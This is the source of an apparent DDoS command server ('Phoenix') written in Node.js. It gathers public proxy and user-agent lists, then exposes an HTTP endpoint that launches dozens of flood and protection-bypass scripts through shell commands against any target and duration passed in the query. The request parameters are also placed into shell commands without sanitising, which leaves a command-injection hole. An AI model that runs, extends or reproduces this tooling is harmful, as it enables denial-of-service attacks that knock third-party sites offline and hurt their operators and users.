const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const colors = {
    reset: '\x1b[0m',
    bold: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    gray: '\x1b[90m'
};

const sym = {
    info: '▢',
    success: '✓',
    error: '▤',
    arrow: '▶',
    dash: '▸',
    star: '◈',
    warning: '⚠',
    process: '◉'
};

function log(type, message, detail = '') {
    const timestamp = new Date().toLocaleTimeString('id-ID', { hour12: false });
    let color, symbol;
    
    switch(type) {
        case 'info': color = colors.cyan; symbol = sym.info; break;
        case 'success': color = colors.green; symbol = sym.success; break;
        case 'error': color = colors.red; symbol = sym.error; break;
        case 'warn': color = colors.yellow; symbol = sym.warning; break;
        case 'attack': color = colors.magenta; symbol = sym.star; break;
        case 'system': color = colors.blue; symbol = sym.arrow; break;
        case 'process': color = colors.white; symbol = sym.process; break;
        default: color = colors.gray; symbol = sym.dash;
    }
    
    console.log(
        `${colors.bold}[${timestamp}]${colors.reset} ` +
        `${color}${symbol}${colors.reset} ` +
        `${colors.bold}${message}${colors.reset}` +
        (detail ? ` ${colors.gray}${detail}${colors.reset}` : '')
    );
}

function logExec(methodName, filePath, target) {
    log('process', 'Exec', `${methodName} ${colors.gray}→${colors.reset} ${target}`);
}

function handleExecError(methodName, error) {
    if (error) {
        log('error', 'Fail', `${methodName} | ${error.message}`);
    } else {
        log('success', 'Succesfuly', methodName);
    }
}

async function checkAndInstallModules() {
    const requiredModules = ['express', 'child_process', 'fs'];
    const missingModules = [];
    
    for (const mod of requiredModules) {
        try {
            require.resolve(mod);
        } catch (e) {
            missingModules.push(mod);
            log('error', 'Missing', mod);
        }
    }
    
    if (missingModules.length > 0) {        
        const { execSync } = require('child_process');
        try {
            execSync(`npm install ${missingModules.join(' ')}`, { stdio: 'inherit' });
        } catch (err) {
            log('error', 'Install Fail', err.message);
            process.exit(1);
        }
    }
}

const proxyUrls = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://rootjazz.com/proxies/proxies.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.openproxylist.xyz/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
    try {
        let allData = "";
        let successCount = 0;

        for (const url of proxyUrls) {
            try {
                const response = await fetch(url);
                const data = await response.text();
                allData += data + "\n";
                successCount++;
            } catch (err) {
                log('error', 'Proxy Fail', url.split('/')[2]);
            }
        }

        fs.writeFileSync("proxy.txt", allData, "utf-8");         
    } catch (error) {
        log('error', 'Proxy Scrape', error.message);
    }
}

async function scrapeUserAgent() {
    try {
        const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
        const data = await response.text();
        fs.writeFileSync('ua.txt', data, 'utf-8');
    } catch (error) {
        log('error', 'UA Fail', error.message);
    }
}

async function fetchData() {
    try {
        const response = await fetch('https://httpbin.org/get');
        const data = await response.json();
        log('success', 'IP', `${data.origin}:${port}`);
        return data;
    } catch (error) {
        log('error', 'IP Fail', error.message);
    }
}

function getRandomUA() {
    try {
        const uaList = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(line => line.trim() !== '');
        return uaList[Math.floor(Math.random() * uaList.length)].trim();
    } catch (e) {
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }
}

let attackStats = {
    total: 0,
    active: 0,
    methods: {}
};

function updateStats(method) {
    attackStats.total++;
    attackStats.active++;
    attackStats.methods[method] = (attackStats.methods[method] || 0) + 1;
    
    if (attackStats.total % 5 === 0) {
        log('system', 'STATS', `Total:${attackStats.total} | Active:${attackStats.active}`);
    }
}

function showBanner() {
    console.clear();
    console.log(`${colors.cyan}
    ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
    ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
    ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
    ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                    D D O S  S E R V E R
    ${colors.reset}`);
}

function execMethod(cmd, methodName, target) {
    logExec(methodName, cmd.split(' ')[1], target);
    exec(cmd, (error, stdout, stderr) => {
        handleExecError(methodName, error);
    });
}

app.get('/exc', (req, res) => {
    const { target, time, methods } = req.query;

    if (!target || !time || !methods) {
        log('error', 'PARAMS', 'Missing target/time/methods');
        return res.status(400).json({
            error: 'Missing parameters',
            required: ['target', 'time', 'methods']
        });
    }

    res.status(200).json({
        message: 'API request received. Executing script shortly, By JooModdss #Phoenix',
        target,
        time,
        methods
    });
    
    log('attack', 'Attack', `${methods} → [${time}s]`);
    
    const randomUA = getRandomUA();
    const randomCookie = `session=${Math.random().toString(36).substring(7)}`;
    
    if (methods === 'Kill') {
        execMethod(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`, 'H2CA', target);
        execMethod(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`, 'HDRH2', target);
        execMethod(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`, 'H2F3', target);
        execMethod(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`, 'BLAST', target);
        
    } else if (methods === 'Phoenix') {
         execMethod(`node ./methods/bypass-exc.js ${target}`, 'bypass-exc', target);
        execMethod(`node ./methods/captcha666.js ${target}`, 'captcha666', target);
        execMethod(`node ./methods/Nexus.js POST ${target} proxy.txt ${time} 15 150 cookie="session=abc123" postdata="data=test" randomstring="param" headerdata="User-Agent=Mozilla"`, 'Nexus', target);
        execMethod(`node ./methods/rape.js HEAD ${time} 150 proxy.txt 15 ${target}`, 'rape', target);  
        execMethod(`node ./methods/killnet.js ${target} ${time} 100 10 proxy.txt`, 'killnet', target);
        execMethod(`node ./methods/memek-browser.js ${target} ${time} 100 10 200`, 'memek-browser', target);
        execMethod(`node ./methods/layer.js ${target} ${time} 100 10 proxy.txt`, 'layer', target);
        execMethod(`node ./methods/layer.js POST ${target} ${time} 100 200 proxy.txt`, 'layer', target);  
        execMethod(`node ./methods/crot.js ${target} ${time} 100 10 proxy.txt`, 'crot', target);
        execMethod(`node ./methods/privm.js ${target} ${time} 100 10 proxy.txt`, 'privm', target);
        execMethod(`node ./methods/Kyuu.js ${target} ${time} 100 10 proxy.txt`, 'Kyuu', target);
        execMethod(`node ./methods/Medusa.js ${target} ${time} 100 10 proxy.txt`, 'Medusa', target);
        execMethod(`node ./methods/h2-flood.js ${target} ${time} 100 10 proxy.txt`, 'h2-flood', target);
        execMethod(`node ./methods/floodv2.js ${target} ${time} 100 10 proxy.txt`, 'floodv2', target);
        execMethod(`node ./methods/bom.js ${target} ${time} 100 10 proxy.txt`, 'bom', target);
        execMethod(`node ./methods/stormx.js ${target} ${time} 100 10 proxy.txt`, 'stormx', target);
        execMethod(`node ./methods/tlsxv2.js ${target} ${time} 100 10 proxy.txt`, 'tlsxv2', target);
        execMethod(`node ./methods/browserx.js ${target} ${time} 100 10 proxy.txt`, 'browserx', target);
        execMethod(`node ./methods/h2.js ${target} ${time} 100 10 proxy.txt`, 'h2', target);
        execMethod(`node ./methods/h2raw.js ${target} ${time} 100 10 proxy.txt`, 'h2raw', target);
        execMethod(`node ./methods/priv.js ${target} ${time} 100 10 proxy.txt`, 'priv', target);
        execMethod(`node ./methods/Browsers.js ${target} ${time} 100 10`, 'Browsers', target);
        execMethod(`node ./methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`, 'TLS-BYPASS', target);
        execMethod(`node ./methods/hold.js ${target} ${time} 100 10 proxy.txt`, 'hold', target);
        execMethod(`node ./methods/raw.js ${target} ${time}`, 'raw', target);
        execMethod(`node ./methods/yayav2.js ${target} ${time} "${randomCookie}" "${randomUA}" proxy.txt`, 'yayav2', target);
        execMethod(`node ./methods/HTTP.js ${target} ${time}`, 'HTTP', target);
        execMethod(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`, 'HTTPS', target);
        execMethod(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`, 'HTTPX', target);
        execMethod(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`, 'BLAST', target);
        execMethod(`node ./methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`, 'MIXMAX', target);
        
    } else if (methods === 'Exorcist') {
        execMethod(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`, 'TLS', target);
        execMethod(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`, 'R2', target);
        execMethod(`node ./methods/RAND.js ${target} ${time}`, 'RAND', target);
        execMethod(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`, 'BLAST', target);
        
    } else if (methods === 'Blaze') {
        execMethod(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`, 'H2CA', target);
        execMethod(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`, 'HDRH2', target);
        execMethod(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`, 'H2F3', target);
        execMethod(`node ./methods/HTTP.js ${target} ${time}`, 'HTTP', target);
        execMethod(`node ./methods/RAND.js ${target} ${time}`, 'RAND', target);
        execMethod(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`, 'TLS', target);
        execMethod(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`, 'R2', target);
        execMethod(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`, 'HTTPS', target);
        execMethod(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`, 'HTTPX', target);
        execMethod(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`, 'BLAST', target);
        
    } else if (methods === 'Ultimate') {
        execMethod(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`, 'H2CA', target);
        execMethod(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`, 'pidoras', target);
        execMethod(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`, 'floods', target);
        execMethod(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`, 'browser', target);
        execMethod(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`, 'HDRH2', target);
        execMethod(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`, 'H2F3', target);
        execMethod(`node ./methods/HTTP.js ${target} ${time}`, 'HTTP', target);
        execMethod(`node ./methods/Cloudflare.js ${target} ${time} 100`, 'Cloudflare', target);
        execMethod(`node ./methods/RAND.js ${target} ${time}`, 'RAND', target);
        execMethod(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`, 'TLS', target);
        execMethod(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`, 'R2', target);
        execMethod(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`, 'HTTPS', target);
        execMethod(`node ./methods/HTTP-RAW.js ${target} ${time} 100 10 proxy.txt`, 'HTTP-RAW', target);
        execMethod(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`, 'HTTPX', target);
        execMethod(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`, 'BLAST', target);
        
    } else if (methods === 'Exercist') {
        execMethod(`node ./methods/novaria.js ${target} ${time} 100 10 proxy.txt`, 'novaria', target);
        execMethod(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`, 'pidoras', target);
        execMethod(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`, 'floods', target);
        execMethod(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`, 'browser', target);
        execMethod(`node ./methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`, 'CBROWSER', target);
        execMethod(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`, 'H2CA', target);
        execMethod(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`, 'H2F3', target);
        execMethod(`node ./methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`, 'H2GEC', target);
        execMethod(`node ./methods/HTTP.js ${target} ${time}`, 'HTTP', target);
        execMethod(`node ./methods/FLUTRA.js ${target} ${time}`, 'FLUTRA', target);
        execMethod(`node ./methods/Cloudflare.js ${target} ${time} 100`, 'Cloudflare', target);
        execMethod(`node ./methods/CFbypass.js ${target} ${time}`, 'CFbypass', target);
        execMethod(`node ./methods/bypassv1.js ${target} proxy.txt ${time} 100 10`, 'bypassv1', target);
        execMethod(`node ./methods/hyper.js ${target} ${time} 100`, 'hyper', target);
        execMethod(`node ./methods/RAND.js ${target} ${time}`, 'RAND', target);
        execMethod(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`, 'TLS', target);
        execMethod(`node ./methods/TLS-LOST.js ${target} ${time} 100 10 proxy.txt`, 'TLS-LOST', target);
        execMethod(`node ./methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`, 'TLS-BYPASS', target);
        execMethod(`node ./methods/tls.vip.js ${target} ${time} 100 10 proxy.txt`, 'tls.vip', target);
        execMethod(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`, 'R2', target);
        execMethod(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`, 'HTTPS', target);
        execMethod(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`, 'HTTPX', target);
        execMethod(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`, 'BLAST', target);
        
    } else {
        log('error', 'UNKNOWN', `Method "${methods}" not found`);
    }
});

process.on('uncaughtException', (err) => {
    log('error', 'EXCEPTION', err.message);
});

process.on('unhandledRejection', (err) => {
    log('error', 'REJECTION', err.message);
});

(async () => {
    showBanner();
    await checkAndInstallModules();
    
    app.listen(port, () => {
        log('success', 'Server', `Running on port ${port}`);
        scrapeProxy();
        scrapeUserAgent();
        fetchData();
    });
})();